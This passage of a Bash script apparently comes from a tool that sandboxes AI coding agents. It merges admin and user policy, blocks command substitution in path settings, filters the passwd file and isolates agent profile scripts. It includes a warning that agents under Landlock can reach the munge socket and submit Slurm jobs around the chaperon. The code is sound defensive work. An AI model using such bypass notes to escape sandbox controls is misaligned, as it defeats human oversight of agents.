    _merge_additions _user_ewp  _ADMIN_EXTRA_WRITABLE_PATHS   EXTRA_WRITABLE_PATHS
    _merge_additions _user_rom  _ADMIN_READONLY_MOUNTS        READONLY_MOUNTS
    _merge_additions _user_hro  _ADMIN_HOME_READONLY          HOME_READONLY
    _merge_additions _user_app  _ADMIN_ALLOWED_PROJECT_PARENTS ALLOWED_PROJECT_PARENTS

    # HOME_WRITABLE: merge user additions, but strip admin HOME_READONLY items
    for _item in "${_user_hw[@]}"; do
        _in_admin=false
        for _a in "${_ADMIN_HOME_WRITABLE[@]}"; do
            [[ "$_item" == "$_a" ]] && { _in_admin=true; break; }
        done
        if ! $_in_admin; then
            # Check it's not an admin HOME_READONLY escalation
            local _is_admin_ro=false
            for _aro in "${_ADMIN_HOME_READONLY[@]}"; do
                [[ "$_item" == "$_aro" ]] && { _is_admin_ro=true; break; }
            done
            $_is_admin_ro || HOME_WRITABLE+=("$_item")
        fi
    done

    # --- Enforce DENIED_WRITABLE_PATHS ---
    if [[ ${#DENIED_WRITABLE_PATHS[@]} -gt 0 ]]; then
        local _clean=() _denied _full_path

        # Check EXTRA_WRITABLE_PATHS
        for _item in "${EXTRA_WRITABLE_PATHS[@]}"; do
            _found=false
            for _denied in "${DENIED_WRITABLE_PATHS[@]}"; do
                _denied="${_denied/\$HOME/$HOME}"
                _denied="${_denied%/}"
                if [[ "$_item" == "$_denied" || "$_item" == "$_denied/"* ]]; then
                    echo "WARNING: ${_label} added EXTRA_WRITABLE_PATHS entry '${_item}' under denied path '${_denied}' — removed." >&2
                    _found=true; break
                fi
            done
            $_found || _clean+=("$_item")
        done
        EXTRA_WRITABLE_PATHS=("${_clean[@]}")

        # Check HOME_WRITABLE (entries are $HOME-relative)
        _clean=()
        for _item in "${HOME_WRITABLE[@]}"; do
            _full_path="$HOME/$_item"
            _found=false
            for _denied in "${DENIED_WRITABLE_PATHS[@]}"; do
                _denied="${_denied/\$HOME/$HOME}"
                _denied="${_denied%/}"
                if [[ "$_full_path" == "$_denied" || "$_full_path" == "$_denied/"* ]]; then
                    echo "WARNING: ${_label} added HOME_WRITABLE entry '${_item}' under denied path '${_denied}' — removed." >&2
                    _found=true; break
                fi
            done
            $_found || _clean+=("$_item")
        done
        HOME_WRITABLE=("${_clean[@]}")
    fi
}

# --- Source a trusted config file (admin-owned, no isolation needed) ---
_source_trusted_config() {
    local _conf="$1"
    if ! bash -n "$_conf" 2>/dev/null; then
        echo "Error: Syntax error in $_conf" >&2
        bash -n "$_conf" >&2
        exit 1
    fi
    # shellcheck disable=SC1090
    source "$_conf"
}

# --- Snapshot admin config values after loading ---
_snapshot_admin_config() {
    # Auto-discover token path before snapshotting, so the admin value
    # is captured and enforced through _enforce_admin_policy().
    if [[ -z "${SANDBOX_BYPASS_TOKEN:-}" && -n "${TOKEN_FILE:-}" ]]; then
        SANDBOX_BYPASS_TOKEN="$TOKEN_FILE"
    fi

    _ADMIN_BLOCKED_FILES=("${BLOCKED_FILES[@]}")
    _ADMIN_BLOCKED_ENV_VARS=("${BLOCKED_ENV_VARS[@]}")
    _ADMIN_BLOCKED_ENV_PATTERNS=("${BLOCKED_ENV_PATTERNS[@]}")
    _ADMIN_ALLOWED_ENV_VARS=("${ALLOWED_ENV_VARS[@]}")
    _ADMIN_EXTRA_BLOCKED_PATHS=("${EXTRA_BLOCKED_PATHS[@]}")
    _ADMIN_HOME_READONLY=("${HOME_READONLY[@]}")
    _ADMIN_HOME_WRITABLE=("${HOME_WRITABLE[@]}")
    _ADMIN_DENIED_WRITABLE_PATHS=("${DENIED_WRITABLE_PATHS[@]}")
    _ADMIN_EXTRA_WRITABLE_PATHS=("${EXTRA_WRITABLE_PATHS[@]}")
    _ADMIN_READONLY_MOUNTS=("${READONLY_MOUNTS[@]}")
    _ADMIN_ALLOWED_PROJECT_PARENTS=("${ALLOWED_PROJECT_PARENTS[@]}")
    _ADMIN_SANDBOX_BYPASS_TOKEN="${SANDBOX_BYPASS_TOKEN:-}"
    _ADMIN_TOKEN_FILE="${TOKEN_FILE:-}"

    # Security-critical booleans: snapshot so users cannot weaken them.
    _ADMIN_PRIVATE_TMP="${PRIVATE_TMP:-true}"
    _ADMIN_PRIVATE_IPC="${PRIVATE_IPC:-true}"
    _ADMIN_FILTER_PASSWD="${FILTER_PASSWD:-true}"
}

# ── Phase 1: Source admin config (trusted — admin-owned, root-protected) ──
if [[ -n "$_ADMIN_CONF" && -f "$_ADMIN_CONF" ]]; then
    _source_trusted_config "$_ADMIN_CONF"
    _snapshot_admin_config
fi

# ── Phase 2: Load user config (untrusted — runs in isolated subprocess) ──
_load_untrusted_config "$_USER_CONF" "User config"

# ── Phase 3: Enforce admin policy ──
# Pure comparison + merge — no re-sourcing, no eval of untrusted code.
if [[ -n "$_ADMIN_CONF" ]]; then
    _enforce_admin_policy "User config"
fi

# Restore explicit backend override (env/CLI takes precedence over config)
if [[ -n "$_SANDBOX_BACKEND_OVERRIDE" ]]; then
    SANDBOX_BACKEND="$_SANDBOX_BACKEND_OVERRIDE"
fi
unset _SANDBOX_BACKEND_OVERRIDE

# Restore env overrides for security booleans (env takes precedence over
# config, but admin enforcement still wins — checked below).
for _bvar in PRIVATE_TMP PRIVATE_IPC FILTER_PASSWD; do
    _override_var="_${_bvar}_OVERRIDE"
    if [[ -n "${!_override_var}" ]]; then
        eval "${_bvar}=\"${!_override_var}\""
    fi
    unset "$_override_var"
done
unset _bvar _override_var
# Re-enforce admin policy on the env-overridden values: env can loosen
# user config but cannot weaken admin-set security booleans.
if [[ -n "$_ADMIN_CONF" ]]; then
    for _bvar in PRIVATE_TMP PRIVATE_IPC FILTER_PASSWD; do
        eval "_admin_val=\"\${_ADMIN_${_bvar}:-}\""
        if _is_true "$_admin_val" && ! _is_true "${!_bvar}"; then
            echo "WARNING: env override ${_bvar}=false blocked by admin policy — restored to true." >&2
            eval "${_bvar}=true"
        fi
    done
    unset _bvar _admin_val
fi

# ── Validate config ──────────────────────────────────────────────

# Reject command substitution or backticks in path arrays (defense in depth).
_validate_path_array() {
    local name="$1"; shift
    for item in "$@"; do
        if [[ "$item" =~ \$\( ]] || [[ "$item" =~ \` ]]; then
            echo "Error: Command substitution in $name: $item" >&2
            exit 1
        fi
    done
}

# ── Per-project config overrides ─────────────────────────────────
#
# Loads *.conf files from conf.d/ in an isolated subprocess (same as
# user.conf), then enforces admin policy. Each conf.d file can use
# _PROJECT_DIR to guard itself:
#   [[ "$_PROJECT_DIR" == /some/prefix/* ]] || return 0
#
# Called once from sandbox-exec.sh after PROJECT_DIR is resolved.

load_project_config() {
    local _PROJECT_DIR="$1"
    local _conf_d="$_USER_DATA_DIR/conf.d"

    if [[ -d "$_conf_d" ]]; then
        local _f
        for _f in "$_conf_d"/*.conf; do
            [[ -f "$_f" ]] || continue
            # Each conf.d file runs in its own subprocess with _PROJECT_DIR
            # available so it can guard on project path.
            _PROJECT_DIR="$_PROJECT_DIR" _load_untrusted_config "$_f" "Project config ($(basename "$_f"))"
        done
    fi

    # Re-enforce admin policy after all conf.d additions
    if [[ -n "${_ADMIN_CONF:-}" ]]; then
        _enforce_admin_policy "Project config"
    fi

    # Validate all path arrays
    _validate_path_array ALLOWED_PROJECT_PARENTS "${ALLOWED_PROJECT_PARENTS[@]}"
    _validate_path_array READONLY_MOUNTS "${READONLY_MOUNTS[@]}"
    _validate_path_array HOME_READONLY "${HOME_READONLY[@]}"
    _validate_path_array HOME_WRITABLE "${HOME_WRITABLE[@]}"
    _validate_path_array BLOCKED_FILES "${BLOCKED_FILES[@]}"
    _validate_path_array EXTRA_BLOCKED_PATHS "${EXTRA_BLOCKED_PATHS[@]}"
    _validate_path_array EXTRA_WRITABLE_PATHS "${EXTRA_WRITABLE_PATHS[@]}"
}

# Fail early if HOME is unset (many paths depend on it).
if [[ -z "${HOME:-}" ]]; then
    echo "Error: \$HOME is not set." >&2
    exit 1
fi

# Warn about critical READONLY_MOUNTS that are missing from config.
# Without these, the sandbox starts but almost nothing works inside it.
for _critical_mount in /usr /lib /bin /sbin /etc; do
    _found=false
    for _m in "${READONLY_MOUNTS[@]}"; do
        if [[ "$_m" == "$_critical_mount" ]]; then _found=true; break; fi
    done
    if ! $_found && [[ -d "$_critical_mount" ]]; then
        echo "WARNING: $_critical_mount is not in READONLY_MOUNTS. The sandbox may not function correctly." >&2
    fi
done

# Agent-specific HOME_WRITABLE entries are added automatically by
# _apply_agent_profiles(). No hardcoded critical-path warnings needed.

# Detect paths that appear in both HOME_READONLY and HOME_WRITABLE.
# The writable mount wins (later bwrap arg overrides), which may
# silently escalate permissions beyond what the user intended.
for _ro in "${HOME_READONLY[@]}"; do
    for _rw in "${HOME_WRITABLE[@]}"; do
        if [[ "$_ro" == "$_rw" ]]; then
            echo "WARNING: $HOME/$_ro is in both HOME_READONLY and HOME_WRITABLE (writable wins)." >&2
        fi
    done
done

# Warn when backend-specific features are used with an incompatible backend.
if [[ "${SANDBOX_BACKEND:-auto}" == "landlock" ]]; then
    if _is_true "${FILTER_PASSWD:-true}"; then
        echo "WARNING: FILTER_PASSWD=true has no effect with the Landlock backend (no mount namespace)." >&2
        echo "  User enumeration prevention requires bwrap or firejail." >&2
    fi
    if [[ ${#BLOCKED_FILES[@]} -gt 0 ]]; then
        echo "WARNING: BLOCKED_FILES has no effect with the Landlock backend." >&2
        echo "  Individual file blocking requires bwrap or firejail." >&2
    fi
    if [[ -e /run/munge/munge.socket.2 ]]; then
        echo "WARNING: Landlock cannot block AF_UNIX connect() — the munge socket is reachable." >&2
        echo "  Agents can bypass the chaperon and submit arbitrary Slurm jobs." >&2
        echo "  Use bwrap/firejail, or deploy the SPANK plugin (ADMIN_HARDENING.md §1)." >&2
    fi
fi
if [[ "${SANDBOX_BACKEND:-auto}" != "bwrap" && "${SANDBOX_BACKEND:-auto}" != "auto" ]]; then
    if _is_true "${BIND_DEV_PTS:-false}"; then
        echo "WARNING: BIND_DEV_PTS only applies to the bwrap backend." >&2
    fi
fi

# Auto-discover bypass token path.
# TOKEN_FILE is the Slurm wrapper name; SANDBOX_BYPASS_TOKEN is the sandbox name.
# The admin config may set either.
if [[ -z "${SANDBOX_BYPASS_TOKEN:-}" && -n "${TOKEN_FILE:-}" ]]; then
    SANDBOX_BYPASS_TOKEN="$TOKEN_FILE"
fi

# ── Helpers ─────────────────────────────────────────────────────

validate_project_dir() {
    local dir="$1"
    for parent in "${ALLOWED_PROJECT_PARENTS[@]}"; do
        parent="${parent/\$HOME/$HOME}"
        parent="${parent%/}"  # strip trailing slash
        # Exact match or proper subdirectory (with / boundary).
        # Without the boundary check, parent=/home/alice would
        # incorrectly match dir=/home/alicebob/project.
        if [[ "$dir" == "$parent" || "$dir" == "$parent/"* ]]; then
            return 0
        fi
    done
    echo "Error: Project directory not under an allowed parent path." >&2
    echo "  Got: $dir" >&2
    echo "  Allowed prefixes: ${ALLOWED_PROJECT_PARENTS[*]}" >&2
    echo "  Edit ALLOWED_PROJECT_PARENTS in $SANDBOX_CONF to allow more." >&2
    return 1
}

# ── Passwd filtering (LDAP/AD user enumeration prevention) ────────
#
# Generates a minimal /etc/passwd and /etc/nsswitch.conf for use inside
# the sandbox.  The filtered passwd contains only system accounts
# (UID < 1000) and the current user.  The filtered nsswitch.conf
# replaces "ldap", "sss", and "compat" with "files" for the passwd
# and group databases, so getent only returns local entries.
#
# Sets _FILTERED_PASSWD and _FILTERED_NSSWITCH to the generated paths.
# Backends that support file overlays (bwrap) use these directly.

generate_filtered_passwd() {
    _is_true "${FILTER_PASSWD:-true}" || return 0

    local tmpdir="$_USER_DATA_DIR/.passwd-filter"
    mkdir -p "$tmpdir"

    local my_uid
    my_uid="$(id -u)"

    # Minimal passwd: system accounts (UID < 1000) from the local file.
    # Does NOT use getent for the base set (that would pull all LDAP users).
    awk -F: '($3 < 1000)' /etc/passwd > "$tmpdir/passwd"

    # Append specific users via getent (handles both local and LDAP).
    # Current user + service users needed by tools inside the sandbox.
    for _svc_user in "$(id -un)" slurm munge nobody; do
        if ! grep -q "^${_svc_user}:" "$tmpdir/passwd"; then
            getent passwd "$_svc_user" >> "$tmpdir/passwd" 2>/dev/null || true
        fi
    done

    # Minimal group: system groups (GID < 1000) from the local file.
    awk -F: '($3 < 1000)' /etc/group > "$tmpdir/group"

    # Append current user's groups, service groups, and well-known groups
    # by name (nogroup/nfsnobody may appear via NFS even when not in id -G).
    for _svc_group in nogroup nfsnobody; do
        if ! grep -q "^${_svc_group}:" "$tmpdir/group"; then
            getent group "$_svc_group" >> "$tmpdir/group" 2>/dev/null || true
        fi
    done
    # Add all of the current user's groups (by GID and by name as fallback).
    # This ensures `id` inside the sandbox shows the correct group names,
    # even though supplementary groups are always preserved at the kernel level
    # (bwrap does not use --unshare-user, so file permissions work regardless).
    for _svc_gid in $(id -G) $(getent passwd slurm 2>/dev/null | cut -d: -f4) $(getent passwd munge 2>/dev/null | cut -d: -f4); do
        if ! grep -q "^[^:]*:[^:]*:${_svc_gid}:" "$tmpdir/group"; then
            getent group "$_svc_gid" >> "$tmpdir/group" 2>/dev/null || true
        fi
    done
    # Fallback: also try by name (some LDAP setups resolve names but not GIDs)
    for _svc_gname in $(id -Gn 2>/dev/null); do
        if ! grep -q "^${_svc_gname}:" "$tmpdir/group"; then
            getent group "$_svc_gname" >> "$tmpdir/group" 2>/dev/null || true
        fi
    done

    # nsswitch.conf: replace ldap/sss/compat with files-only for passwd/group
    if [[ -f /etc/nsswitch.conf ]]; then
        sed -E \
            -e 's/^(passwd|group):.*$/\1:         files/' \
            /etc/nsswitch.conf > "$tmpdir/nsswitch.conf"
    else
        printf 'passwd:         files\ngroup:          files\nhosts:          files dns\n' \
            > "$tmpdir/nsswitch.conf"
    fi

    _FILTERED_PASSWD="$tmpdir/passwd"
    _FILTERED_GROUP="$tmpdir/group"
    _FILTERED_NSSWITCH="$tmpdir/nsswitch.conf"
}

# ── Agent profile system ───────────────────────────────────────────
#
# Agent profiles live in agents/<name>/ and are always prepared — there
# is no detection gate. Profiles are split into two halves:
#
#   config.conf — DECLARATIVE metadata (env vars + paths the agent uses).
#                 Read by _check_agent_requirements() to emit warnings
#                 when declared needs look unreachable. Sourced in a
#                 subshell, so mutations to sandbox permission globals
#                 cannot leak to the parent.
#
#   overlay.sh  — mechanical config merge (CLAUDE.md / AGENTS.md /
#                 settings.json) and env-var export. Writes only to the
#                 _AGENT_* staging arrays below; run in a subshell by
#                 prepare_agent_configs() with outputs marshalled via a
#                 tagged-line stdout protocol, so mutations to permission
#                 globals are structurally unable to reach the parent.
#
# All permission grants (HOME_WRITABLE, HOME_READONLY, BLOCKED_FILES,
# ALLOWED_ENV_VARS, etc.) live in the sandbox configuration layer
# (sandbox.conf — user and admin — plus per-project conf.d/*.conf),
# so the effective permissions are reconstructable from the config
# hierarchy alone.

# Environment exports collected from agent overlays (e.g. CLAUDE_CONFIG_DIR=...)
_AGENT_ENV_EXPORTS=()
# Sandbox-config directories to bind-mount (writable) inside the sandbox
_AGENT_SANDBOX_CONFIG_DIRS=()
# Individual files within config dirs to protect via ro-bind
_AGENT_PROTECTED_FILES=()

# ── Helpers ────────────────────────────────────────────────────────

# _agent_file AGENT_NAME FILENAME — resolve a user-customizable agent
# file (agent.md, settings.json). Returns the user copy if it exists
# in ~/.config/agent-sandbox/agents/<name>/, otherwise the install-dir
# default. Called by overlay.sh scripts to find instruction/settings
# templates.
_agent_file() {
    local _name="$1" _file="$2"
    local _user_path="$_USER_DATA_DIR/agents/$_name/$_file"
    local _default_path="$SANDBOX_DIR/agents/$_name/$_file"
    if [[ -f "$_user_path" ]]; then
        echo "$_user_path"
    else
        echo "$_default_path"
    fi
}

# _deploy_agent_files — copy user-customizable agent files (agent.md,
# settings.json) from the install dir to the user config dir. Skips
# files the user has modified (detected via .origin-sha256 sidecar).
# Overwrites unmodified copies so upgrades propagate automatically.
# Called once per sandbox start from prepare_agent_configs.
_deploy_agent_files() {
    local agents_dir="$SANDBOX_DIR/agents"
    [[ -d "$agents_dir" ]] || return 0
    [[ ${#ENABLED_AGENTS[@]} -gt 0 ]] || return 0

    local agent_name agent_dir src dest dest_dir sha_file
    for agent_name in "${ENABLED_AGENTS[@]}"; do
        agent_dir="$agents_dir/$agent_name/"
        [[ -d "$agent_dir" ]] || continue
        dest_dir="$_USER_DATA_DIR/agents/$agent_name"

        for src in "$agent_dir"agent.md "$agent_dir"settings.json; do
            [[ -f "$src" ]] || continue
            local fname
            fname="$(basename "$src")"
            dest="$dest_dir/$fname"
            sha_file="$dest_dir/.$fname.origin-sha256"

            local src_sha
            src_sha="$(sha256sum "$src" | cut -d' ' -f1)"

            if [[ -f "$dest" ]]; then
                if [[ -f "$sha_file" ]]; then
                    local origin_sha
                    origin_sha="$(cat "$sha_file" 2>/dev/null)"
                    local dest_sha
                    dest_sha="$(sha256sum "$dest" | cut -d' ' -f1)"
                    if [[ "$dest_sha" == "$origin_sha" ]]; then
                        if [[ "$src_sha" != "$origin_sha" ]]; then
                            # Unmodified + new version available — update
                            cp "$src" "$dest"
                            echo "$src_sha" > "$sha_file"
                        fi
                    elif [[ "$src_sha" != "$origin_sha" ]]; then
                        # User modified AND new version available
                        _is_true "${SANDBOX_QUIET:-false}" || \
                            echo "sandbox: agents/$agent_name/$fname has local edits — new version available in $src" >&2
                    fi
                fi
            else
                # First deploy
                mkdir -p "$dest_dir"
                cp "$src" "$dest"
                echo "$src_sha" > "$sha_file"
            fi
        done
    done
}

# _agent_warnings_suppressed NAME — return 0 if warnings for this agent
# should be silenced (SUPPRESS_AGENT_WARNINGS contains "all" or NAME).
_agent_warnings_suppressed() {
    local _name="$1" _entry
    for _entry in "${SUPPRESS_AGENT_WARNINGS[@]}"; do
        [[ "$_entry" == "all" || "$_entry" == "$_name" ]] && return 0
    done
    return 1
}

# _env_var_reachable VAR — return 0 if VAR would make it into the
# sandbox: it is set in the outer env AND is not effectively blocked
# (i.e., either in ALLOWED_ENV_VARS, or not in BLOCKED_ENV_VARS and not
# matching any BLOCKED_ENV_PATTERNS).
_env_var_reachable() {
    local _var="$1"
    # Must be set in the outer environment
    [[ -n "${!_var:-}" ]] || return 1
    # ALLOWED_ENV_VARS trumps everything
    _is_allowed_env "$_var" && return 0
    # Explicit blocklist
    local _b
    for _b in "${BLOCKED_ENV_VARS[@]}"; do
        [[ "$_var" == "$_b" ]] && return 1
    done
    # Glob-pattern blocklist
    _is_blocked_by_pattern "$_var" && return 1
    return 0
}

# _path_is_writable PATH — return 0 if PATH is reachable as writable
# inside the sandbox: either listed in HOME_WRITABLE (when under $HOME),
# EXTRA_WRITABLE_PATHS, or is the project dir.
_path_is_writable() {
    local _p="$1"
    # Normalise leading $HOME
    local _rel=""
    if [[ "$_p" == "$HOME/"* ]]; then
        _rel="${_p#"$HOME"/}"
    elif [[ "$_p" == "$HOME" ]]; then
        _rel=""
    fi
    if [[ -n "$_rel" ]]; then
        local _hw
        for _hw in "${HOME_WRITABLE[@]}"; do
            # Exact match or ancestor (_rel under a writable subtree)
            [[ "$_rel" == "$_hw" || "$_rel" == "$_hw/"* ]] && return 0
        done
    fi
    local _ewp
    for _ewp in "${EXTRA_WRITABLE_PATHS[@]}"; do
        [[ "$_p" == "$_ewp" || "$_p" == "$_ewp/"* ]] && return 0
    done
    return 1
}

# _path_is_readable PATH — return 0 if PATH is reachable as readable
# inside the sandbox: writable counts as readable, plus HOME_READONLY
# entries and READONLY_MOUNTS outside $HOME.
_path_is_readable() {
    local _p="$1"
    _path_is_writable "$_p" && return 0
    local _rel=""
    if [[ "$_p" == "$HOME/"* ]]; then
        _rel="${_p#"$HOME"/}"
    elif [[ "$_p" == "$HOME" ]]; then
        _rel=""
    fi
    if [[ -n "$_rel" ]]; then
        local _hr
        for _hr in "${HOME_READONLY[@]}"; do
            [[ "$_rel" == "$_hr" || "$_rel" == "$_hr/"* ]] && return 0
        done
    fi
    local _rom
    for _rom in "${READONLY_MOUNTS[@]}"; do
        [[ "$_p" == "$_rom" || "$_p" == "$_rom/"* ]] && return 0
    done
    return 1
}

# _ensure_writable_home_dirs — mkdir -p missing HOME_WRITABLE entries
# that live under $HOME. Runs outside the sandbox so we can create real
# dirs that persist across sessions; agents can then write credentials
# during first-time in-sandbox auth and have them outlast the session.
# Only creates directories (not files) and only under $HOME, so nothing
# else on the filesystem is touched.
_ensure_writable_home_dirs() {
    local _entry _target
    for _entry in "${HOME_WRITABLE[@]}"; do
        # Skip entries that look like files (have a dot in the basename
        # and no trailing slash) — e.g. ".claude.json" stays as a file.
        # Only pre-create plain directory names.
        local _base
        _base="$(basename "$_entry")"
        [[ "$_base" == *.json || "$_base" == *.yml || "$_base" == *.yaml \
           || "$_base" == *.toml || "$_base" == *.conf ]] && continue
        _target="$HOME/$_entry"
        # Never overwrite: only create if missing. Ignore failures
        # (permission, NFS, etc.) — it's a convenience, not a contract.
        [[ -e "$_target" ]] || mkdir -p "$_target" 2>/dev/null || true
    done
}

# ── Agent profile application ──────────────────────────────────────

# _apply_agent_profiles — for each agent in ENABLED_AGENTS, source its
# agents/<name>/config.conf in a subshell and fold the declared paths
# into the sandbox permission arrays (HOME_WRITABLE / HOME_READONLY /
# EXTRA_WRITABLE_PATHS / BLOCKED_FILES).
#
# Same isolation pattern as prepare_agent_configs: the subshell can
# only communicate back via a tagged-line protocol on stdout. This
# makes it structurally impossible for a config.conf to mutate
# anything other than the recognized AGENT_* metadata fields.
#
# Path placement: paths under $HOME become HOME_WRITABLE / HOME_READONLY
# entries (relative to $HOME, matching the existing convention);
# absolute paths outside $HOME become EXTRA_WRITABLE_PATHS entries
# (read-side only-outside-$HOME paths still need explicit READONLY_MOUNTS).
#
# Must run AFTER user/admin/conf.d config has been loaded (so an
# explicit ENABLED_AGENTS in user config wins over the default), and
# BEFORE _check_agent_requirements / prepare_agent_configs (which both
# iterate ENABLED_AGENTS and assume the grants are in place).
_apply_agent_profiles() {
    local agents_dir="$SANDBOX_DIR/agents"
    [[ -d "$agents_dir" ]] || return 0
    [[ ${#ENABLED_AGENTS[@]} -gt 0 ]] || return 0

    local agent_name config _meta _tag _val _rel
    for agent_name in "${ENABLED_AGENTS[@]}"; do
        config="$agents_dir/$agent_name/config.conf"
        [[ -f "$config" ]] || continue

        _meta="$(
            set +u
            AGENT_REQUIRED_WRITABLE_PATHS=()
            AGENT_REQUIRED_READABLE_PATHS=()
            AGENT_BLOCKED_FILES=()
            # shellcheck disable=SC1090
            source "$config" 2>/dev/null || exit 0
            printf 'WRITE\t%s\n' "${AGENT_REQUIRED_WRITABLE_PATHS[@]}"
            printf 'READ\t%s\n'  "${AGENT_REQUIRED_READABLE_PATHS[@]}"
            printf 'BLOCK\t%s\n' "${AGENT_BLOCKED_FILES[@]}"
        )"

        while IFS=$'\t' read -r _tag _val; do
            [[ -n "$_val" ]] || continue
            case "$_tag" in
                WRITE)
                    if [[ "$_val" == "$HOME/"* ]]; then
                        _rel="${_val#"$HOME"/}"
                        _array_contains "$_rel" "${HOME_WRITABLE[@]}" \
                            || HOME_WRITABLE+=("$_rel")
                    elif [[ "$_val" == "$HOME" ]]; then
                        # An entire-$HOME grant is a no-op (HOME_ACCESS handles it)
                        :
                    else
                        _array_contains "$_val" "${EXTRA_WRITABLE_PATHS[@]}" \
                            || EXTRA_WRITABLE_PATHS+=("$_val")
                    fi
                    ;;
                READ)
                    if [[ "$_val" == "$HOME/"* ]]; then
                        _rel="${_val#"$HOME"/}"
                        _array_contains "$_rel" "${HOME_READONLY[@]}" \
                            || HOME_READONLY+=("$_rel")
                    fi
                    # Outside-$HOME read paths require explicit READONLY_MOUNTS
                    # — deliberately not auto-added here (would expand the read
                    # surface beyond what an agent profile should control).
                    ;;
                BLOCK)
                    _array_contains "$_val" "${BLOCKED_FILES[@]}" \
                        || BLOCKED_FILES+=("$_val")
                    ;;
            esac
        done <<< "$_meta"
    done
}

# _array_contains VALUE ARRAY... — return 0 if any element of ARRAY
# equals VALUE. Used by _apply_agent_profiles to keep its merges
# idempotent across multiple sandbox invocations or repeated config
# loads. Empty array is handled correctly (returns 1).
_array_contains() {
    local _needle="$1"; shift
    local _e
    for _e in "$@"; do
        [[ "$_e" == "$_needle" ]] && return 0
    done
    return 1
}

# ── Agent-metadata warning check ───────────────────────────────────

# _check_agent_requirements — for each agent in ENABLED_AGENTS, source
# its config.conf in a subshell (isolated so it cannot mutate globals),
# read the declarative metadata, and warn once per agent if its
# credentials/paths look unreachable. SUPPRESS_AGENT_WARNINGS silences
# per-agent or all. Disabled agents are skipped entirely (no warnings
# for tools the user doesn't use).
_check_agent_requirements() {
    _is_true "${SANDBOX_QUIET:-false}" && return 0
    local agents_dir="$SANDBOX_DIR/agents"
    [[ -d "$agents_dir" ]] || return 0
    [[ ${#ENABLED_AGENTS[@]} -gt 0 ]] || return 0

    local agent_name agent_dir config
    for agent_name in "${ENABLED_AGENTS[@]}"; do
        agent_dir="$agents_dir/$agent_name"
        [[ -d "$agent_dir" ]] || continue
        config="$agent_dir/config.conf"
        [[ -f "$config" ]] || continue
        _agent_warnings_suppressed "$agent_name" && continue

        # Source in a subshell with the arrays pre-declared to isolate
        # side effects. The `declare` statements export the metadata
        # back to the parent via command substitution — we read lines.
        local _meta
        _meta="$(
            set +u
            AGENT_CREDENTIAL_ENV_VARS=()
            AGENT_AUTH_MARKERS=()
            AGENT_REQUIRED_WRITABLE_PATHS=()
            AGENT_REQUIRED_READABLE_PATHS=()
            AGENT_LOGIN_HINT=""
            # shellcheck disable=SC1090
            source "$config" 2>/dev/null || exit 0
            # Emit each array on a line with a tag, then the hint.
            printf 'CRED_ENV\t%s\n' "${AGENT_CREDENTIAL_ENV_VARS[@]}"
            printf 'AUTH_MARK\t%s\n' "${AGENT_AUTH_MARKERS[@]}"
            printf 'WRITE\t%s\n' "${AGENT_REQUIRED_WRITABLE_PATHS[@]}"
            printf 'READ\t%s\n' "${AGENT_REQUIRED_READABLE_PATHS[@]}"
            printf 'HINT\t%s\n' "$AGENT_LOGIN_HINT"
        )"

        # Parse the metadata back.
        local -a _cred_env=() _auth_mark=() _writable=() _readable=()
        local _hint=""
        local _tag _val
        while IFS=$'\t' read -r _tag _val; do
            case "$_tag" in
                CRED_ENV)  [[ -n "$_val" ]] && _cred_env+=("$_val") ;;
                AUTH_MARK) [[ -n "$_val" ]] && _auth_mark+=("$_val") ;;
                WRITE)     [[ -n "$_val" ]] && _writable+=("$_val") ;;
                READ)      [[ -n "$_val" ]] && _readable+=("$_val") ;;
                HINT)      _hint="$_val" ;;
            esac
        done <<< "$_meta"

        # ─ Credential check ─
        # Only warn when the sandbox is actively MASKING credentials the
        # user has: env vars that are set but would be blocked, or auth
        # marker files that exist but are under a blocked/hidden path.
        # If the user simply hasn't set up the agent yet (no env var, no
        # auth files), that's not a sandbox concern — stay silent.
        # Auth markers (file-based credentials) suppress the warning:
        # if the agent can authenticate via files, blocking the env var
        # is harmless.
        local _has_auth_marker=false _m
        for _m in "${_auth_mark[@]}"; do
            [[ -e "$_m" ]] && { _has_auth_marker=true; break; }
        done

        if ! $_has_auth_marker; then
            local _masked_vars=() _v
            for _v in "${_cred_env[@]}"; do
                # Var is set in outer env but would NOT reach the sandbox
                [[ -n "${!_v:-}" ]] && ! _env_var_reachable "$_v" && _masked_vars+=("$_v")
            done

            if [[ ${#_masked_vars[@]} -gt 0 ]]; then
                echo "sandbox: warning: ${agent_name}: credentials present but blocked" >&2
                echo "  blocked env vars: ${_masked_vars[*]}" >&2
                echo "  add to ALLOWED_ENV_VARS in sandbox.conf to let them through" >&2
                echo "  silence with: SUPPRESS_AGENT_WARNINGS+=(\"${agent_name}\") in sandbox.conf" >&2
            fi
        fi

        # ─ Path reachability check ─
        local _path _unreachable=()
        for _path in "${_writable[@]}"; do
            _path_is_writable "$_path" || _unreachable+=("$_path (writable)")
        done
        for _path in "${_readable[@]}"; do
            _path_is_readable "$_path" || _unreachable+=("$_path (readable)")
        done
        if [[ ${#_unreachable[@]} -gt 0 ]]; then
            echo "sandbox: warning: ${agent_name}: paths not reachable inside sandbox:" >&2
            for _path in "${_unreachable[@]}"; do
                echo "  $_path" >&2
            done
            echo "  add the missing entries to HOME_WRITABLE / HOME_READONLY in sandbox.conf," >&2
            echo "  or silence with: SUPPRESS_AGENT_WARNINGS+=(\"${agent_name}\")" >&2
        fi
    done
}

# prepare_agent_configs PROJECT_DIR — run every agent's overlay.sh.
# All agents are always prepared (no detection); missing config dirs are
# pre-created by _ensure_writable_home_dirs so first-run in-sandbox auth
# persists.
#
# Each overlay runs in a SUBSHELL with the three staging arrays
# pre-cleared. The overlay's only channel back to the parent is a tagged
# line protocol on stdout: `ENV\t<value>`, `DIR\t<value>`, `FILE\t<value>`.
# This makes overlay mutations of permission-enforced globals (BLOCKED_*,
# HOME_*, ALLOWED_ENV_VARS, etc.) structurally impossible — they would
# die in the subshell and never reach the parent. No snapshot/diff
# guardrail is needed.
#
# The subshell still has filesystem access, so host-side side effects
# (merging CLAUDE.md / AGENTS.md, creating sandbox-config/ dirs,
# symlinking tokens) still work. A one-time ~1ms fork per agent on
# sandbox start replaces the per-start snapshot-and-compare.
#
# Staging-array values are paths and env var assignments of the form
# KEY=VALUE; real values never contain tabs or newlines, so the tagged
# protocol needs no escaping.
prepare_agent_configs() {
    local project_dir="$1"
    local agents_dir="$SANDBOX_DIR/agents"
    _AGENT_ENV_EXPORTS=()
    _AGENT_SANDBOX_CONFIG_DIRS=()
    _AGENT_PROTECTED_FILES=()

    [[ -d "$agents_dir" ]] || return 0
    [[ ${#ENABLED_AGENTS[@]} -gt 0 ]] || return 0

    # Pre-create missing HOME_WRITABLE entries so overlays see the real
    # config dirs (for symlinking) and first-time auth writes persist.
